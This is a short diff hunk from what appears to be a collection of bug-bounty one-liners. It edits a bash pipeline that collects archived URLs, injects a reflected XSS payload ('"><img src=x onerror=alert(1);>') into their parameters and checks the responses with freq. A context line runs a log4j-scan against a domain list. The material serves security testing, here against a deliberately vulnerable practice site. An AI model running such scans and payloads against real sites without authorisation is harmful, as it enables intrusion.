@@ -115,7 +115,7 @@ bbrf domains | httpx -silent | xargs -I@ sh -c 'python3 http://log4j-scan.py -u 
 ###  FREQ XSS 
 - [Explained command](https://bit.ly/3u8Qpeu)
 ```bash
-echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
+echo testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'
 ```
 
 
